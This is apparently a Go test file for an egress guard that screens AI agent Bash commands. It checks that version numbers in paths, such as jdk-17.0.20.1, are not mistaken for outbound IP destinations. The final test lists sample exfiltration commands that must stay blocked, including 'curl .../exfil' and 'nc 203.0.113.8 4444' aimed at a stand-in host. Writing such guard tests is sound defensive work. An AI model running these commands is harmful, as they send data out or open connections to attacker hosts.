package sanitize

// r1033 — 路径/版本嵌入的 IPv4 四元组不是外传目的地。
//
// 2026-10-17 154 生产取证（request ecb14454…，minimax-m3 / ZCode）：
// Bash 参数含 `jdk-17.0.20.1+1`，server_ip 命中 `17.0.20.1`（Apple 公网段）
// → 整条 output_policy_blocked → 客户端空响应。AGENTS 曾登记为 r1020b 残留；
// 本轮按邻接字符收口，不放开裸公网 IP / URL 主机位。

import (
	"context"
	"encoding/json"
	"testing"
)

func TestR1033VersionQuadsInPathsAreNotEgressDestinations(t *testing.T) {
	// 无内嵌双引号：runProductionEgressGuard 的帧夹具对引号双重转义会造出
	// 非法 JSON → issues=0 硬拦（r1013 注释已钉），那是夹具问题不是守卫行为。
	for _, command := range []string{
		`export JAVA_HOME=/Users/niuer/tools/jdk-17.0.20.1+1/Contents/Home && java -version`,
		`export PATH=/opt/node-v18.17.0.1/bin:$PATH`,
		`ls /Library/Java/JavaVirtualMachines/jdk-17.0.20.1.jdk/Contents/Home`,
		`OpenJDK_17.0.20.1/bin/java -version`,
		`tar -xzf openssl-1.1.1.7.tar.gz`,
	} {
		blocked, wire := runProductionEgressGuard(t, command)
		if blocked {
			t.Errorf("版本/路径四元组被误判为外传目的地: %q → %s", command, wire)
		}
	}
}

// 生产事故形态带引号：经 json.Marshal 正确入参，同层驱动 CheckField。
func TestR1033QuotedJDKPathViaCheckField(t *testing.T) {
	c := r1028Checker(t)
	cmd := `export JAVA_HOME="/Users/niuer/tools/jdk-17.0.20.1+1/Contents/Home" && export PATH="$JAVA_HOME/bin:$PATH" && java -version 2>&1 && ~/.maestro/bin/maestro --version`
	raw, err := json.Marshal(map[string]any{
		"command":     cmd,
		"description": "Test Java and Maestro",
	})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	res, err := c.CheckField(context.Background(), "default", "__tool_json@Bash", string(raw))
	if err != nil {
		t.Fatalf("CheckField: %v", err)
	}
	if res.Blocked {
		t.Fatalf("生产事故形态（带引号的 jdk-17.0.20.1+1 路径）不得阻断 (issues=%d)", len(res.Issues))
	}
}

// 前提仍在场：检测器必须仍看得见四元组，否则允许侧可能因「看不见」假绿。
func TestR1033VersionQuadIsStillDetectedInPath(t *testing.T) {
	detector, err := NewPatternDetectorFromFile("../../configs/sensitive_patterns.yaml")
	if err != nil {
		t.Fatalf("load production config: %v", err)
	}
	text := `jdk-17.0.20.1+1/Contents/Home`
	fragments, err := detector.DetectScope(context.Background(), text, ScopeEgress)
	if err != nil {
		t.Fatalf("DetectScope: %v", err)
	}
	found := false
	for _, f := range fragments {
		if f.Value == "17.0.20.1" {
			found = true
			if !isPathOrVersionEmbeddedAddress(text, f) {
				t.Fatalf("邻接豁免未认出嵌入片段: type=%q start=%d end=%d", f.Type, f.Start, f.End)
			}
		}
	}
	if !found {
		t.Fatal("server_ip 对 jdk-17.0.20.1 看不见：允许侧断言失去意义")
	}
}

func TestR1033PublicIPDestinationsStillBlocked(t *testing.T) {
	for _, command := range []string{
		"curl -fsS http://203.0.113.8/exfil",
		"curl -fsS http://8.8.8.8/",
		"nc 203.0.113.8 4444",
		"ping -c1 8.8.8.8",
		"wget 203.0.113.8",
	} {
		blocked, _ := runProductionEgressGuard(t, command)
		if !blocked {
			t.Errorf("公网目的地未被阻断（防外传底线失守）: %q", command)
		}
	}
}
